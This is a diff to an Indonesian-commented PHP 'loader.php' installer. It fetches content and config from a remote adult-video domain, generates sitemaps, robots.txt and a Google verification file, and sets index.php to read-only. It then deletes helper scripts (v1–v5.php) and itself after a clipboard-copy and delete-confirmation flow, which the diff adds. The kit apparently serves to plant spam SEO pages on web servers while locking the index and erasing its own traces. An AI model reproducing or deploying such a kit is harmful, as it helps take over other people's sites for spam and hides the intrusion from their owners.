@@ -20,7 +20,7 @@ $base_content_url_path = 'https://player.javpornsub.net/content/';
 // Path Penyimpanan
 $cache_dir = $server_path . '/.private';
 $local_config_path = $cache_dir . '/config.php';
-$local_json_content_path = $cache_dir . '/content.json'; // Path untuk JSON lokal
+$local_json_content_path = $cache_dir . '/content.json'; 
 $local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
 $local_robots_path = $server_path . '/robots.txt';
 $local_sitemap_path = $server_path . '/sitemap.xml'; 
@@ -86,7 +86,7 @@ function buat_robots_txt($domain) {
  * TAHAP 2: Dijalankan setelah form disubmit
  */
 function jalankan_instalasi() {
-    global $clean_host, $server_path, $self_script_name,
+    global $clean_host, $host, $server_path, $self_script_name,
            $config_url, $local_config_path, $keyword_url, $base_content_url_path,
            $local_sitemap_path, $local_json_content_path;
 
@@ -100,7 +100,6 @@ function jalankan_instalasi() {
     if (substr($json_filename, -5) !== '.json') $json_filename .= '.json';
     $derived_content_url = $base_content_url_path . $json_filename;
     
-    // URL Keyword sekarang di-hardcode
     $derived_keyword_url = $keyword_url; 
 
     $logs = [
@@ -185,7 +184,7 @@ function jalankan_instalasi() {
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index (sitemap.xml) dan $num_maps sub-sitemap (sitemap-*.xml) dibuat."];
     $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];
 
-    // --- PERMINTAAN 1: Chmod index.php ---
+    // 6. Chmod index.php
     $index_path = $server_path . '/index.php';
     if (@chmod($index_path, 0444)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Permission index.php diubah ke 0444 (read-only).'];
@@ -193,9 +192,9 @@ function jalankan_instalasi() {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal mengubah permission index.php. Lakukan manual.'];
     }
 
-    // --- PERMINTAAN 2 & 3: Lanjut ke TAHAP 3 (Prompt Hapus) ---
+    // 7. Lanjut ke TAHAP 3 (Prompt Salin Domain)
     $full_domain_url = $protocol . $host; // Menggunakan host asli (dengan www jika ada)
-    tampilkan_prompt_penghapusan($logs, $full_domain_url);
+    tampilkan_prompt_salin_domain($logs, $full_domain_url);
 }
 
 /**
@@ -322,18 +321,17 @@ function tampilkan_halaman_installer() {
 }
 
 /**
- * TAHAP 3: Tampilkan prompt konfirmasi, salin URL, dan tunggu Enter
+ * TAHAP 3: Tampilkan log instalasi, tunggu Enter untuk SALIN
  */
-function tampilkan_prompt_penghapusan($logs, $full_domain_url) {
+function tampilkan_prompt_salin_domain($logs, $full_domain_url) {
     global $self_script_name;
-    // Tambahkan log baru untuk clipboard dan peringatan
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Domain ' . htmlspecialchars($full_domain_url) . ' berhasil disalin ke clipboard!'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PERINGATAN: Pastikan Anda telah verifikasi domain di Google Search Console!'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'File (v*.php, google...html, ' . $self_script_name . ') akan dihapus permanen.'];
-    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk KONFIRMASI PENGHAPUSAN...'];
+    // Tambahkan log baru untuk prompt SALIN
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain Anda: ' . htmlspecialchars($full_domain_url)];
+    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk MENYALIN domain dan lanjut ke tahap hapus...'];
 
-    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Salin Domain</title>
     <style>
+        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
         .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
@@ -355,7 +353,7 @@ function tampilkan_prompt_penghapusan($logs, $full_domain_url) {
         <div class="terminal">
             <div class="terminal-header">
                 <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
-                <div style="color: #666; font-size: 10px;">loader.php (Konfirmasi Hapus)</div>
+                <div style="color: #666; font-size: 10px;">loader.php (Tahap 3 - Salin Domain)</div>
             </div>
             <div class="terminal-content" id="terminalContent">
                 <div id="logsContainer"></div>
@@ -374,6 +372,102 @@ function tampilkan_prompt_penghapusan($logs, $full_domain_url) {
                 document.addEventListener("keydown", function(e) {
                     if (e.key === "Enter") {
                         e.preventDefault(); 
+                        // 1. Coba Salin
+                        try {
+                            navigator.clipboard.writeText(\'' . $full_domain_url . '\');
+                        } catch (err) {
+                            // Gagal tidak apa-apa, lanjut
+                        }
+                        // 2. Lanjut ke TAHAP 4 (Konfirmasi Hapus)
+                        window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
+                    }
+                }, { once: true }); 
+                return;
+            }
+            
+            const log = logs[currentLog];
+            if (currentChar === 0) {
+                currentLine = document.createElement("div");
+                currentLine.className = "log-entry";
+                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
+                container.appendChild(currentLine);
+            }
+            const messageElement = currentLine.querySelector(".typing");
+            if (currentChar < log.message.length) {
+                messageElement.textContent += log.message[currentChar];
+                currentChar++;
+                setTimeout(typeNextChar, 8);
+            } else {
+                messageElement.classList.remove("typing");
+                currentChar = 0;
+                currentLog++;
+                setTimeout(typeNextChar, 50);
+            }
+        }
+        
+        // Langsung mulai typing
+        setTimeout(typeNextChar, 200); 
+    </script>
+    </body></html>';
+}
+
+/**
+ * TAHAP 4: Tampilkan prompt konfirmasi HAPUS, tunggu Enter untuk HAPUS
+ */
+function tampilkan_prompt_hapus() {
+    global $self_script_name;
+    // Log untuk TAHAP 4
+    $logs = [
+        ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Domain berhasil disalin ke clipboard!'],
+        ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PERINGATAN: Pastikan Anda telah verifikasi domain di Google Search Console!'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'File (v*.php, google...html, ' . $self_script_name . ') akan dihapus permanen.'],
+        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk KONFIRMASI PENGHAPUSAN...']
+    ];
+
+    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
+    <style>
+        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
+        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
+        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
+        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
+        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
+        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
+        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
+        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
+        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
+        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
+        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
+        .prompt { color: #28ca42; font-size: 11px; }
+        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
+    </style>
+    </head>
+    <body>
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
+                <div style="color: #666; font-size: 10px;">loader.php (Tahap 4 - Konfirmasi Hapus)</div>
+            </div>
+            <div class="terminal-content" id="terminalContent">
+                <div id="logsContainer"></div>
+            </div>
+        </div>
+    <script>
+        const logs = ' . json_encode($logs) . ';
+        const container = document.getElementById("logsContainer");
+        let currentLog = 0; let currentChar = 0; let currentLine = null;
+        
+        function typeNextChar() {
+            if (currentLog >= logs.length) {
+                // Tampilkan prompt terakhir
+                container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
+                // Tambahkan event listener untuk Enter
+                document.addEventListener("keydown", function(e) {
+                    if (e.key === "Enter") {
+                        e.preventDefault(); 
+                        // Lanjut ke TAHAP 5 (PENGHAPUSAN)
                         window.location.href = \'' . $self_script_name . '?action=cleanup\';
                     }
                 }, { once: true }); 
@@ -399,28 +493,21 @@ function tampilkan_prompt_penghapusan($logs, $full_domain_url) {
                 setTimeout(typeNextChar, 50);
             }
         }
-
-        // Salin ke clipboard DULU, baru mulai animasi log
-        try {
-            navigator.clipboard.writeText(\'' . $full_domain_url . '\').then(function() {
-                setTimeout(typeNextChar, 200); // Sukses, mulai tampilkan log
-            }).catch(function() {
-                setTimeout(typeNextChar, 200); // Gagal, tetap tampilkan log
-            });
-        } catch (err) {
-            setTimeout(typeNextChar, 200); // Gagal (misal di non-https), tetap tampilkan log
-        }
+        
+        // Langsung mulai typing
+        setTimeout(typeNextChar, 200); 
     </script>
     </body></html>';
 }
 
+
 /**
- * TAHAP 4: Hapus file dan hapus diri sendiri
+ * TAHAP 5: Hapus file dan hapus diri sendiri
  */
 function jalankan_penghapusan_terakhir() {
     global $server_path, $self_script_name;
     
-    // Daftar file yang akan dihapus (Permintaan 3)
+    // Daftar file yang akan dihapus
     $files_to_delete = [
         'v1.php', 'v2.php', 'v3.php', 'v4.php', 'v5.php', 'vx.php',
         'google8f39414e57a5615a.html'
@@ -445,7 +532,6 @@ function jalankan_penghapusan_terakhir() {
     // Hapus diri sendiri
     @unlink(__FILE__);
     
-    // Tampilkan pesan terakhir (browser mungkin tidak sempat menampilkannya)
     echo "<pre>$log_hapus</pre>";
 }
 
@@ -455,6 +541,7 @@ function jalankan_penghapusan_terakhir() {
 function tampilkan_log_terminal($logs, $next_action = 'done') {
     echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
     <style>
+        /* (CSS Terminal sama seperti sebelumnya, disembunyikan agar ringkas) */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
         .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
@@ -521,9 +608,15 @@ function tampilkan_log_terminal($logs, $next_action = 'done') {
 
 // --- [ROUTER UTAMA] ---
 
-// TAHAP 4: User menekan Enter di TAHAP 3. Ini adalah aksi terakhir.
+// TAHAP 5 (Final): User menekan Enter di TAHAP 4. Ini adalah aksi terakhir.
 if (isset($_GET['action']) && $_GET['action'] === 'cleanup') {
     jalankan_penghapusan_terakhir();
+    exit;
+}
+
+// TAHAP 4: User menekan Enter di TAHAP 3.
+if (isset($_GET['action']) && $_GET['action'] === 'confirm_delete') {
+    tampilkan_prompt_hapus();
     exit;
 }
 
